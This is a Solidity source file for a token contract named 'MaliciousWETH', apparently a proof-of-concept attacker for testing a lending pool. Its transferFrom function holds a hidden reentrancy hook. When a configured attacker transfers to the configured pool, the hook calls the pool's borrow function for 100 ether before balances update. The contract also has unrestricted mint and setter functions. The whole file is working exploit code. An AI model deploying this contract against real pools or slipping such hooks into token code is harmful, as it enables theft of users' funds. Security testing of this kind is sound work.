// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

// Malicious WETH with reentrancy - standalone contract
contract MaliciousWETH {
    string public name = "Malicious WETH";
    string public symbol = "mWETH";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    address public poolAddr;
    address public attacker;
    bool public reentering = false;
    uint256 public reenterCount = 0;

    constructor() {
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        allowance[from][msg.sender] -= amount;
        
        // Reentrancy hook
        if (!reentering && from == attacker && to == poolAddr) {
            reentering = true;
            reenterCount++;
            (bool success, ) = poolAddr.call(abi.encodeWithSignature("borrow(uint256)", 100 ether));
            require(success, "Reentrancy call failed");
            reentering = false;
        }
        
        // Transfer FROM the 'from' address, not msg.sender
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function setPoolAddress(address _poolAddr) public {
        poolAddr = _poolAddr;
    }
    
    function setAttacker(address _attacker) public {
        attacker = _attacker;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
